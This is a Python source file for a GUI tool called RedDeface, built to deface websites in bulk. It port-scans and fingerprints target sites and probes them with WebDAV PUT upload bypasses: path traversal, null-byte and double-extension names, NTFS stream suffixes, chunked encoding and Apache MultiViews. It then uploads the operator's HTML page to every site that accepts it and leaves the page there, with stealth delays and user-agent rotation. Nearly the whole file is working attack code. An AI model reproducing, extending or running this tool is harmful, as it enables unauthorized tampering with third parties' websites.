#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import json
import requests
import threading
import socket
import csv
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

# Import PyQt5
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtWidgets import (QApplication, QMainWindow, QTabWidget, QWidget, 
                            QVBoxLayout, QHBoxLayout, QLabel, QLineEdit, 
                            QPushButton, QTextEdit, QGroupBox, QListWidget,
                            QListWidgetItem, QFileDialog, QMessageBox, QProgressBar,
                            QComboBox, QCheckBox, QSpinBox, QSplitter, QFrame,
                            QTableWidget, QTableWidgetItem, QHeaderView, QAction,
                            QMenu, QSystemTrayIcon, QStyle, QToolBar, QStatusBar,
                            QDialog, QDialogButtonBox, QFormLayout, QInputDialog)

# ANSI Colors (for console)
class colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    PURPLE = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"
    END = "\033[0m"

# Configuration
CONFIG = {
    'timeout': 10,
    'max_workers': 10,
    'delay': 0,
    'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (RedDeface/1.0)',
    'verbose': False,
    'proxy': None,
    'stealth_mode': False,
    'random_delay': False,
    'max_retries': 3
}

# Thread to run tests without blocking the interface
class TestThread(QThread):
    update_signal = pyqtSignal(str)
    progress_signal = pyqtSignal(int)
    finished_signal = pyqtSignal(dict)
    result_signal = pyqtSignal(dict)

    def __init__(self, targets, html_file, config):
        super().__init__()
        self.targets = targets
        self.html_file = html_file
        self.config = config
        self.is_running = True

    def run(self):
        results = self.run_tests()
        self.finished_signal.emit(results)

    def stop(self):
        self.is_running = False

    def apply_stealth_delay(self):
        """Apply random delay for stealth mode"""
        if self.config.get('stealth_mode', False):
            delay = random.uniform(1, 5)
            time.sleep(delay)
        elif self.config.get('random_delay', False):
            delay = random.uniform(0.1, 2)
            time.sleep(delay)

    def test_connectivity(self, url):
        try:
            response = requests.head(url, timeout=self.config['timeout'], 
                                    headers={'User-Agent': self.config['user_agent']})
            return response.status_code < 400
        except:
            return False

    def port_scan(self, url):
        """Scan common ports before testing"""
        parsed = urlparse(url)
        hostname = parsed.hostname
        ports = [80, 443, 8080, 8443]
        
        open_ports = []
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((hostname, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        
        return open_ports

    def detect_technology(self, url):
        """Detect technology used by the server"""
        try:
            headers = {'User-Agent': self.config['user_agent']}
            response = requests.get(url, headers=headers, timeout=self.config['timeout'])
            
            tech_info = {}
            server_header = response.headers.get('Server', '')
            if server_header:
                tech_info['server'] = server_header
            
            # Basic technology detection
            if 'X-Powered-By' in response.headers:
                tech_info['powered_by'] = response.headers['X-Powered-By']
            
            # Content-based detection
            content = response.text.lower()
            if 'wordpress' in content:
                tech_info['cms'] = 'WordPress'
            elif 'joomla' in content:
                tech_info['cms'] = 'Joomla'
            elif 'drupal' in content:
                tech_info['cms'] = 'Drupal'
            
            return tech_info
        except:
            return {}

    def test_webdav(self, url):
        methods = [
            self.test_put_method,
            self.test_content_type_bypass,
            self.test_path_traversal,
            self.test_null_byte,
            self.test_double_extension,
            self.test_case_sensitivity,
            self.test_header_injection,
            self.test_filename_bypass,
            self.test_http_methods,
            self.test_chunked_encoding,
            self.test_unicode_normalization,
            self.test_windows_shortname,
            self.test_path_obfuscation,
            self.test_apache_multiview
        ]
        
        working_methods = []
        for method in methods:
            if method(url):
                working_methods.append(method.__name__)
        
        return working_methods

    def test_put_method(self, url):
        try:
            # Get file extension
            _, ext = os.path.splitext(self.html_file)
            test_file = f"RedDeface_test{ext}"
            
            with open(self.html_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            headers = {'User-Agent': self.config['user_agent']}
            response = requests.put(f"{url}/{test_file}", data=content, 
                                  headers=headers, timeout=self.config['timeout'])
            
            if response.status_code in [200, 201, 204]:
                check = requests.get(f"{url}/{test_file}", headers=headers, 
                                   timeout=self.config['timeout'])
                if check.status_code == 200:
                    requests.delete(f"{url}/{test_file}", headers=headers, 
                                  timeout=self.config['timeout'])
                    return True
            return False
        except:
            return False

    def test_content_type_bypass(self, url):
        try:
            # Get file extension
            _, ext = os.path.splitext(self.html_file)
            test_file = f"test_bypass{ext}"
            
            with open(self.html_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            headers = {
                'Content-Type': 'image/jpeg',
                'User-Agent': self.config['user_agent']
            }
            
            response = requests.put(f"{url}/{test_file}", data=content, 
                                  headers=headers, timeout=self.config['timeout'])
            
            if response.status_code in [200, 201, 204]:
                check = requests.get(f"{url}/{test_file}", headers=headers, 
                                   timeout=self.config['timeout'])
                if check.status_code == 200:
                    requests.delete(f"{url}/{test_file}", headers=headers, 
                                  timeout=self.config['timeout'])
                    return True
            return False
        except:
            return False

    def test_path_traversal(self, url):
        try:
            # Get file extension
            _, ext = os.path.splitext(self.html_file)
            test_file = f"../../traversal_test{ext}"
            
            with open(self.html_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            headers = {'User-Agent': self.config['user_agent']}
            response = requests.put(f"{url}/{test_file}", data=content, 
                                  headers=headers, timeout=self.config['timeout'])
            
            if response.status_code in [200, 201, 204]:
                parsed = urlparse(url)
                root_url = f"{parsed.scheme}://{parsed.netloc}"
                check = requests.get(f"{root_url}/traversal_test{ext}", 
                                   headers=headers, timeout=self.config['timeout'])
                
                if check.status_code == 200:
                    requests.delete(f"{root_url}/traversal_test{ext}", 
                                  timeout=self.config['timeout'])
                    return True
            return False
        except:
            return False

    def test_null_byte(self, url):
        try:
            # Get file extension
            _, ext = os.path.splitext(self.html_file)
            test_file = f"test{ext}%00.jpg"
            
            with open(self.html_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            headers = {'User-Agent': self.config['user_agent']}
            response = requests.put(f"{url}/{test_file}", data=content, 
                                  headers=headers, timeout=self.config['timeout'])
            
            if response.status_code in [200, 201, 204]:
                check = requests.get(f"{url}/test{ext}", headers=headers, 
                                   timeout=self.config['timeout'])
                if check.status_code == 200:
                    requests.delete(f"{url}/test{ext}", headers=headers, 
                                  timeout=self.config['timeout'])
                    return True
            return False
        except:
            return False

    def test_double_extension(self, url):
        try:
            # Get file extension
            _, ext = os.path.splitext(self.html_file)
            test_file = f"test{ext}.jpg"
            
            with open(self.html_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            headers = {'User-Agent': self.config['user_agent']}
            response = requests.put(f"{url}/{test_file}", data=content, 
                                  headers=headers, timeout=self.config['timeout'])
            
            if response.status_code in [200, 201, 204]:
                check = requests.get(f"{url}/{test_file}", headers=headers, 
                                   timeout=self.config['timeout'])
                if check.status_code == 200:
                    requests.delete(f"{url}/{test_file}", headers=headers, 
                                  timeout=self.config['timeout'])
                    return True
            return False
        except:
            return False

    def test_case_sensitivity(self, url):
        try:
            # Get file extension and convert to uppercase
            _, ext = os.path.splitext(self.html_file)
            test_file = f"TEST{ext.upper()}"
            
            with open(self.html_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            headers = {'User-Agent': self.config['user_agent']}
            response = requests.put(f"{url}/{test_file}", data=content, 
                                  headers=headers, timeout=self.config['timeout'])
            
            if response.status_code in [200, 201, 204]:
                check = requests.get(f"{url}/{test_file}", headers=headers, 
                                   timeout=self.config['timeout'])
                if check.status_code == 200:
                    requests.delete(f"{url}/{test_file}", headers=headers, 
                                  timeout=self.config['timeout'])
                    return True
            return False
        except:
            return False

    def test_header_injection(self, url):
        try:
            # Get file extension
            _, ext = os.path.splitext(self.html_file)
            test_file = f"header_injection{ext}"
            
            with open(self.html_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            headers = {
                'User-Agent': self.config['user_agent'],
                'X-Forwarded-For': '127.0.0.1',
                'X-Real-IP': '127.0.0.1',
                'Referer': url
            }
            
            response = requests.put(f"{url}/{test_file}", data=content, 
                                  headers=headers, timeout=self.config['timeout'])
            
            if response.status_code in [200, 201, 204]:
                check = requests.get(f"{url}/{test_file}", headers=headers, 
                                   timeout=self.config['timeout'])
                if check.status_code == 200:
                    requests.delete(f"{url}/{test_file}", headers=headers, 
                                  timeout=self.config['timeout'])
                    return True
            return False
        except:
            return False

    def test_filename_bypass(self, url):
        # Get file extension
        _, ext = os.path.splitext(self.html_file)
        
        bypasses = [
            f"test{ext}",
            f"test{ext}.",
            f"test{ext} ",
            f"test{ext}%20",
            f"test{ext}::DATA",
            f".test{ext}",
            f"test{ext}{ext}"
        ]
        
        for filename in bypasses:
            try:
                with open(self.html_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                
                headers = {'User-Agent': self.config['user_agent']}
                
                response = requests.put(f"{url}/{filename}", data=content, 
                                      headers=headers, timeout=self.config['timeout'])
                
                if response.status_code in [200, 201, 204]:
                    check = requests.get(f"{url}/{filename}", headers=headers, 
                                       timeout=self.config['timeout'])
                    if check.status_code == 200:
                        requests.delete(f"{url}/{filename}", headers=headers, 
                                      timeout=self.config['timeout'])
                        return True
            except:
                continue
        return False

    def test_http_methods(self, url):
        methods = ['POST', 'PATCH', 'PROPFIND', 'PROPPATCH', 'MKCOL', 'COPY', 'MOVE', 'LOCK', 'UNLOCK']
        
        for method in methods:
            try:
                self.apply_stealth_delay()
                response = requests.request(method, url, timeout=self.config['timeout'],
                                          headers={'User-Agent': self.config['user_agent']})
                if response.status_code not in [405, 501, 403]:
                    return True
            except:
                continue
        return False

    def test_chunked_encoding(self, url):
        try:
            # Get file extension
            _, ext = os.path.splitext(self.html_file)
            test_file = f"chunked_test{ext}"
            
            with open(self.html_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            headers = {
                'User-Agent': self.config['user_agent'],
                'Transfer-Encoding': 'chunked'
            }
            
            # Simplified chunked encoding
            chunked_content = f"{len(content):x}\r\n{content}\r\n0\r\n\r\n"
            
            response = requests.put(f"{url}/{test_file}", data=chunked_content, 
                                  headers=headers, timeout=self.config['timeout'])
            
            if response.status_code in [200, 201, 204]:
                check = requests.get(f"{url}/{test_file}", headers=headers, 
                                   timeout=self.config['timeout'])
                if check.status_code == 200:
                    requests.delete(f"{url}/{test_file}", headers=headers, 
                                  timeout=self.config['timeout'])
                    return True
            return False
        except:
            return False

    def test_unicode_normalization(self, url):
        unicode_tests = [
            "test%E2%80%8E",  # Right-to-left mark
            "test%C0%AE",     # Invalid UTF-8 sequence
            "test%EF%BB%BF"   # Byte order mark
        ]
        
        # Get file extension
        _, ext = os.path.splitext(self.html_file)
        
        for test_prefix in unicode_tests:
            try:
                test_file = f"{test_prefix}{ext}"
                
                with open(self.html_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                
                headers = {'User-Agent': self.config['user_agent']}
                
                response = requests.put(f"{url}/{test_file}", data=content, 
                                      headers=headers, timeout=self.config['timeout'])
                
                if response.status_code in [200, 201, 204]:
                    check = requests.get(f"{url}/{test_file}", headers=headers, 
                                       timeout=self.config['timeout'])
                    if check.status_code == 200:
                        requests.delete(f"{url}/{test_file}", headers=headers, 
                                      timeout=self.config['timeout'])
                        return True
            except:
                continue
        return False

    def test_windows_shortname(self, url):
        try:
            # Create a file with a long name
            long_name = "A" * 20 + ".html"
            short_name = "AAAAAA~1.HTM"
            
            with open(self.html_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            headers = {'User-Agent': self.config['user_agent']}
            
            # Upload with long name
            response = requests.put(f"{url}/{long_name}", data=content, 
                                  headers=headers, timeout=self.config['timeout'])
            
            if response.status_code in [200, 201, 204]:
                # Try to access via short name
                check = requests.get(f"{url}/{short_name}", headers=headers, 
                                   timeout=self.config['timeout'])
                if check.status_code == 200:
                    requests.delete(f"{url}/{long_name}", headers=headers, 
                                  timeout=self.config['timeout'])
                    return True
            return False
        except:
            return False

    def test_path_obfuscation(self, url):
        # Get file extension
        _, ext = os.path.splitext(self.html_file)
        
        obfuscations = [
            f"test/../test{ext}",
            f"/./test/./test{ext}",
            f"test/..././test{ext}",
            f"test/..;/test{ext}"
        ]
        
        for path in obfuscations:
            try:
                with open(self.html_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                
                headers = {'User-Agent': self.config['user_agent']}
                
                response = requests.put(f"{url}/{path}", data=content, 
                                      headers=headers, timeout=self.config['timeout'])
                
                if response.status_code in [200, 201, 204]:
                    check = requests.get(f"{url}/{path}", headers=headers, 
                                       timeout=self.config['timeout'])
                    if check.status_code == 200:
                        requests.delete(f"{url}/{path}", headers=headers, 
                                      timeout=self.config['timeout'])
                        return True
            except:
                continue
        return False

    def test_apache_multiview(self, url):
        try:
            # Get filename without extension
            filename = os.path.basename(self.html_file)
            name, ext = os.path.splitext(filename)
            
            with open(self.html_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            headers = {
                'User-Agent': self.config['user_agent'],
                'Content-Type': 'text/html'
            }
            
            # Upload without extension
            response = requests.put(f"{url}/{name}", data=content, 
                                  headers=headers, timeout=self.config['timeout'])
            
            if response.status_code in [200, 201, 204]:
                # Try to access with extension
                check = requests.get(f"{url}/{name}{ext}", headers=headers, 
                                   timeout=self.config['timeout'])
                if check.status_code == 200:
                    requests.delete(f"{url}/{name}", headers=headers, 
                                  timeout=self.config['timeout'])
                    return True
            return False
        except:
            return False

    def upload_file(self, url, method_name=None):
        methods = {
            'test_put_method': self.upload_put_method,
            'test_content_type_bypass': self.upload_content_type,
            'test_path_traversal': self.upload_path_traversal,
            'test_null_byte': self.upload_null_byte,
            'test_double_extension': self.upload_double_extension,
            'test_case_sensitivity': self.upload_case_sensitivity,
            'test_header_injection': self.upload_header_injection,
            'test_filename_bypass': self.upload_filename_bypass,
            'test_http_methods': self.upload_put_method,  # Use PUT as fallback
            'test_chunked_encoding': self.upload_chunked_encoding,
            'test_unicode_normalization': self.upload_unicode,
            'test_windows_shortname': self.upload_windows_shortname,
            'test_path_obfuscation': self.upload_path_obfuscation,
            'test_apache_multiview': self.upload_apache_multiview
        }
        
        # If specific method is requested, try only that one
        if method_name and method_name in methods:
            return methods[method_name](url)
        
        # Otherwise try all methods
        for method in methods.values():
            if method(url):
                return True
        return False

    def upload_put_method(self, url):
        try:
            # Get filename with original extension
            filename = os.path.basename(self.html_file)
            
            with open(self.html_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            headers = {'User-Agent': self.config['user_agent']}
            response = requests.put(f"{url}/{filename}", data=content, 
                                  headers=headers, timeout=15)
            
            if response.status_code in [200, 201, 204]:
                check = requests.get(f"{url}/{filename}", headers=headers, 
                                   timeout=10)
                if check.status_code == 200:
                    return True
            return False
        except:
            return False

    def upload_content_type(self, url):
        try:
            # Get filename with original extension
            filename = os.path.basename(self.html_file)
            
            with open(self.html_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            headers = {
                'User-Agent': self.config['user_agent'],
                'Content-Type': 'image/jpeg'
            }
            
            response = requests.put(f"{url}/{filename}", data=content, 
                                  headers=headers, timeout=15)
            
            if response.status_code in [200, 201, 204]:
                check = requests.get(f"{url}/{filename}", headers=headers, 
                                   timeout=10)
                if check.status_code == 200:
                    return True
            return False
        except:
            return False

    def upload_path_traversal(self, url):
        try:
            # Get filename with original extension
            filename = os.path.basename(self.html_file)
            
            with open(self.html_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            headers = {'User-Agent': self.config['user_agent']}
            response = requests.put(f"{url}/../../{filename}", data=content, 
                                  headers=headers, timeout=15)
            
            if response.status_code in [200, 201, 204]:
                parsed = urlparse(url)
                root_url = f"{parsed.scheme}://{parsed.netloc}"
                check = requests.get(f"{root_url}/{filename}", headers=headers, 
                                   timeout=10)
                if check.status_code == 200:
                    return True
            return False
        except:
            return False

    def upload_null_byte(self, url):
        try:
            # Get filename with original extension
            filename = os.path.basename(self.html_file)
            name, ext = os.path.splitext(filename)
            
            with open(self.html_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            headers = {'User-Agent': self.config['user_agent']}
            response = requests.put(f"{url}/{name}{ext}%00.jpg", data=content, 
                                  headers=headers, timeout=15)
            
            if response.status_code in [200, 201, 204]:
                check = requests.get(f"{url}/{name}{ext}", headers=headers, 
                                   timeout=10)
                if check.status_code == 200:
                    return True
            return False
        except:
            return False

    def upload_double_extension(self, url):
        try:
            # Get filename with original extension
            filename = os.path.basename(self.html_file)
            name, ext = os.path.splitext(filename)
            
            with open(self.html_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            headers = {'User-Agent': self.config['user_agent']}
            response = requests.put(f"{url}/{name}{ext}.jpg", data=content, 
                                  headers=headers, timeout=15)
            
            if response.status_code in [200, 201, 204]:
                check = requests.get(f"{url}/{name}{ext}.jpg", headers=headers, 
                                   timeout=10)
                if check.status_code == 200:
                    return True
            return False
        except:
            return False

    def upload_case_sensitivity(self, url):
        try:
            # Get filename with uppercase extension
            filename = os.path.basename(self.html_file).upper()
            
            with open(self.html_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            headers = {'User-Agent': self.config['user_agent']}
            response = requests.put(f"{url}/{filename}", data=content, 
                                  headers=headers, timeout=15)
            
            if response.status_code in [200, 201, 204]:
                check = requests.get(f"{url}/{filename}", headers=headers, 
                                   timeout=10)
                if check.status_code == 200:
                    return True
            return False
        except:
            return False

    def upload_header_injection(self, url):
        try:
            # Get filename with original extension
            filename = os.path.basename(self.html_file)
            
            with open(self.html_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            headers = {
                'User-Agent': self.config['user_agent'],
                'X-Forwarded-For': '127.0.0.1',
                'X-Real-IP': '127.0.0.1',
                'Referer': url
            }
            
            response = requests.put(f"{url}/{filename}", data=content, 
                                  headers=headers, timeout=15)
            
            if response.status_code in [200, 201, 204]:
                check = requests.get(f"{url}/{filename}", headers=headers, 
                                   timeout=10)
                if check.status_code == 200:
                    return True
            return False
        except:
            return False

    def upload_filename_bypass(self, url):
        # Get filename with original extension
        filename = os.path.basename(self.html_file)
        name, ext = os.path.splitext(filename)
        
        bypasses = [
            filename,
            f"{filename}.",
            f"{filename} ",
            f"{filename}%20",
            f"{filename}::DATA",
            f".{filename}",
            f"{name}{ext}{ext}"
        ]
        
        for bypass_name in bypasses:
            try:
                with open(self.html_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.put(f"{url}/{bypass_name}", data=content, 
                                      headers=headers, timeout=15)
                
                if response.status_code in [200, 201, 204]:
                    check = requests.get(f"{url}/{bypass_name}", headers=headers, 
                                       timeout=10)
                    if check.status_code == 200:
                        return True
            except:
                continue
        return False

    def upload_chunked_encoding(self, url):
        try:
            # Get filename with original extension
            filename = os.path.basename(self.html_file)
            
            with open(self.html_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            headers = {
                'User-Agent': self.config['user_agent'],
                'Transfer-Encoding': 'chunked'
            }
            
            # Simplified chunked encoding
            chunked_content = f"{len(content):x}\r\n{content}\r\n0\r\n\r\n"
            
            response = requests.put(f"{url}/{filename}", data=chunked_content, 
                                  headers=headers, timeout=15)
            
            if response.status_code in [200, 201, 204]:
                check = requests.get(f"{url}/{filename}", headers=headers, 
                                   timeout=10)
                if check.status_code == 200:
                    return True
            return False
        except:
            return False

    def upload_unicode(self, url):
        unicode_names = [
            "index%E2%80%8E",  # Right-to-left mark
            "index%EF%BB%BF"   # Byte order mark
        ]
        
        # Get file extension
        _, ext = os.path.splitext(self.html_file)
        
        for unicode_prefix in unicode_names:
            try:
                filename = f"{unicode_prefix}{ext}"
                
                with open(self.html_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.put(f"{url}/{filename}", data=content, 
                                      headers=headers, timeout=15)
                
                if response.status_code in [200, 201, 204]:
                    check = requests.get(f"{url}/{filename}", headers=headers, 
                                       timeout=10)
                    if check.status_code == 200:
                        return True
            except:
                continue
        return False

    def upload_windows_shortname(self, url):
        try:
            # Get filename with original extension
            filename = os.path.basename(self.html_file)
            name, ext = os.path.splitext(filename)
            
            # Create a long name
            long_name = name + "A" * 15 + ext
            short_name = name[:6] + "~1" + ext
            
            with open(self.html_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            headers = {'User-Agent': self.config['user_agent']}
            
            # Upload with long name
            response = requests.put(f"{url}/{long_name}", data=content, 
                                  headers=headers, timeout=15)
            
            if response.status_code in [200, 201, 204]:
                # Try to access via short name
                check = requests.get(f"{url}/{short_name}", headers=headers, 
                                   timeout=10)
                if check.status_code == 200:
                    return True
            return False
        except:
            return False

    def upload_path_obfuscation(self, url):
        # Get filename with original extension
        filename = os.path.basename(self.html_file)
        name, ext = os.path.splitext(filename)
        
        obfuscations = [
            f"{name}/../{name}{ext}",
            f"/./{name}/./{name}{ext}",
            f"{name}/..././{name}{ext}"
        ]
        
        for path in obfuscations:
            try:
                with open(self.html_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                
                headers = {'User-Agent': self.config['user_agent']}
                response = requests.put(f"{url}/{path}", data=content, 
                                      headers=headers, timeout=15)
                
                if response.status_code in [200, 201, 204]:
                    check = requests.get(f"{url}/{path}", headers=headers, 
                                       timeout=10)
                    if check.status_code == 200:
                        return True
            except:
                continue
        return False

    def upload_apache_multiview(self, url):
        try:
            # Get name without extension
            filename = os.path.basename(self.html_file)
            name, ext = os.path.splitext(filename)
            
            with open(self.html_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            headers = {
                'User-Agent': self.config['user_agent'],
                'Content-Type': 'text/html'
            }
            
            # Upload without extension
            response = requests.put(f"{url}/{name}", data=content, 
                                  headers=headers, timeout=15)
            
            if response.status_code in [200, 201, 204]:
                # Try to access with extension
                check = requests.get(f"{url}/{name}{ext}", headers=headers, 
                                   timeout=10)
                if check.status_code == 200:
                    return True
            return False
        except:
            return False

    def run_tests(self):
        results = {}
        total = len(self.targets)
        
        for i, target in enumerate(self.targets):
            if not self.is_running:
                break
                
            self.update_signal.emit(f"Testing {target}...")
            self.progress_signal.emit(int((i + 1) / total * 20))  # 20% for initial scan
            
            # Port scan
            open_ports = self.port_scan(target)
            self.update_signal.emit(f"Open ports: {open_ports}")
            
            # Technology detection
            tech_info = self.detect_technology(target)
            if tech_info:
                self.update_signal.emit(f"Detected technologies: {tech_info}")
            
            # Connectivity test
            if not self.test_connectivity(target):
                results[target] = {
                    "status": "OFFLINE", 
                    "methods": [], 
                    "uploaded": False,
                    "ports": open_ports,
                    "technology": tech_info
                }
                self.update_signal.emit(f"{target} is OFFLINE")
                self.result_signal.emit({target: results[target]})
                continue
            
            self.progress_signal.emit(int((i + 1) / total * 40))  # 40% for connectivity
            
            # Vulnerability tests
            methods = self.test_webdav(target)
            if not methods:
                results[target] = {
                    "status": "NOT_VULNERABLE", 
                    "methods": [], 
                    "uploaded": False,
                    "ports": open_ports,
                    "technology": tech_info
                }
                self.update_signal.emit(f"{target} is NOT VULNERABLE")
                self.result_signal.emit({target: results[target]})
                continue
            
            results[target] = {
                "status": "VULNERABLE", 
                "methods": methods, 
                "uploaded": False,
                "ports": open_ports,
                "technology": tech_info
            }
            self.update_signal.emit(f"{target} is VULNERABLE with {len(methods)} methods")
            
            self.progress_signal.emit(int((i + 1) / total * 60))  # 60% for vulnerability tests
            
            # Upload attempt
            self.update_signal.emit(f"Trying to upload to {target}...")
            uploaded = False
            method_used = None
            
            for method in methods:
                if self.upload_file(target, method):
                    results[target]["uploaded"] = True
                    results[target]["method_used"] = method
                    uploaded = True
                    method_used = method
                    self.update_signal.emit(f"Upload to {target} SUCCESSFUL with {method}")
                    break
            
            if not uploaded:
                self.update_signal.emit(f"Upload to {target} FAILED")
            
            self.result_signal.emit({target: results[target]})
            self.progress_signal.emit(int((i + 1) / total * 100))  # 100% at the end
        
        return results

# Main interface class
class CyberPunkWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("RedDeface")
        self.setGeometry(100, 100, 1200, 800)
        
        # Configuration
        self.config = CONFIG.copy()
        self.user_agents = []  # User agents list initialization
        self.proxies = []      # Proxies list initialization
        self.current_project = None
        self.results = {}
        self.history = []
        
        # Load and configure background image
        self.background_image = QtGui.QPixmap()
        self.load_background_image()
        
        # Configure cyberpunk style
        self.setup_styles()
        
        # Initialize interface
        self.init_ui()
        
        # Load default user agents
        self.load_default_user_agents()
        
        # Configure tray icon
        self.setup_tray_icon()
        
    def load_background_image(self):
        # Download or load background image
        image_path = "hack_bg.jpg"
        if not os.path.exists(image_path):
            # If image doesn't exist, try to download it
            try:
                import urllib.request
                urllib.request.urlretrieve("https://i.postimg.cc/prRDmq4P/hack.jpg", image_path)
            except:
                # If failed, use solid color
                self.background_image = None
                return
        
        # Load image and make it 50% transparent
        self.background_image = QtGui.QPixmap(image_path)
        if not self.background_image.isNull():
            # Create transparent image
            transparent = QtGui.QPixmap(self.background_image.size())
            transparent.fill(Qt.transparent)
            
            painter = QtGui.QPainter(transparent)
            painter.setOpacity(0.5)  # 50% transparency
            painter.drawPixmap(0, 0, self.background_image)
            painter.end()
            
            self.background_image = transparent
    
    def setup_styles(self):
        # Cyberpunk style with neons and bright colors
        self.setStyleSheet("""
            QMainWindow {
                background-color: #0a0a12;
            }
            QTabWidget::pane {
                border: 2px solid #00ff41;
                background: rgba(10, 10, 18, 200);
            }
            QTabBar::tab {
                background: #1a1a2e;
                color: #00ff41;
                padding: 10px;
                border: 1px solid #00ff41;
                border-bottom: none;
                border-top-left-radius: 4px;
                border-top-right-radius: 4px;
            }
            QTabBar::tab:selected {
                background: #00ff41;
                color: #0a0a12;
            }
            QGroupBox {
                font-weight: bold;
                color: #ff073a;
                border: 1px solid #ff073a;
                border-radius: 5px;
                margin-top: 1ex;
                padding-top: 10px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                subcontrol-position: top center;
                padding: 0 5px;
            }
            QLabel {
                color: #00ffff;
            }
            QLineEdit, QTextEdit, QListWidget, QTableWidget {
                background-color: #1a1a2e;
                color: #00ff41;
                border: 1px solid #00ff41;
                border-radius: 3px;
                padding: 5px;
            }
            QPushButton {
                background-color: #1a1a2e;
                color: #ff073a;
                border: 1px solid #ff073a;
                border-radius: 3px;
                padding: 5px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #ff073a;
                color: #0a0a12;
            }
            QPushButton:pressed {
                background-color: #cc0630;
            }
            QProgressBar {
                border: 1px solid #00ff41;
                border-radius: 3px;
                text-align: center;
                color: #00ff41;
            }
            QProgressBar::chunk {
                background-color: #00ff41;
            }
            QComboBox {
                background-color: #1a1a2e;
                color: #00ff41;
                border: 1px solid #00ff41;
                border-radius: 3px;
                padding: 5px;
            }
            QComboBox QAbstractItemView {
                background-color: #1a1a2e;
                color: #00ff41;
                selection-background-color: #00ff41;
                selection-color: #0a0a12;
            }
            QCheckBox {
                color: #00ffff;
            }
            QSpinBox {
                background-color: #1a1a2e;
                color: #00ff41;
                border: 1px solid #00ff41;
                border-radius: 3px;
                padding: 5px;
            }
            QHeaderView::section {
                background-color: #1a1a2e;
                color: #00ff41;
                border: 1px solid #00ff41;
                padding: 5px;
            }
            QMenuBar {
                background-color: #1a1a2e;
                color: #00ff41;
            }
            QMenuBar::item:selected {
                background-color: #00ff41;
                color: #0a0a12;
            }
            QMenu {
                background-color: #1a1a2e;
                color: #00ff41;
                border: 1px solid #00ff41;
            }
            QMenu::item:selected {
                background-color: #00ff41;
                color: #0a0a12;
            }
        """)
    
    def setup_tray_icon(self):
        """Configure system tray icon"""
        if not QSystemTrayIcon.isSystemTrayAvailable():
            return
            
        self.tray_icon = QSystemTrayIcon(self)
        self.tray_icon.setIcon(self.style().standardIcon(QStyle.SP_ComputerIcon))
        
        tray_menu = QMenu()
        show_action = tray_menu.addAction("Show")
        show_action.triggered.connect(self.show)
        
        hide_action = tray_menu.addAction("Hide")
        hide_action.triggered.connect(self.hide)
        
        quit_action = tray_menu.addAction("Quit")
        quit_action.triggered.connect(QApplication.quit)
        
        self.tray_icon.setContextMenu(tray_menu)
        self.tray_icon.show()
        self.tray_icon.activated.connect(self.tray_icon_activated)
    
    def tray_icon_activated(self, reason):
        """Handle clicks on system tray icon"""
        if reason == QSystemTrayIcon.DoubleClick:
            if self.isVisible():
                self.hide()
            else:
                self.show()
                self.activateWindow()
    
    def load_default_user_agents(self):
        # Load some default user agents
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (RedDeface/1.0)',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59'
        ]
        
        # Update user agents list in interface
        if hasattr(self, 'user_agent_list'):
            self.user_agent_list.clear()
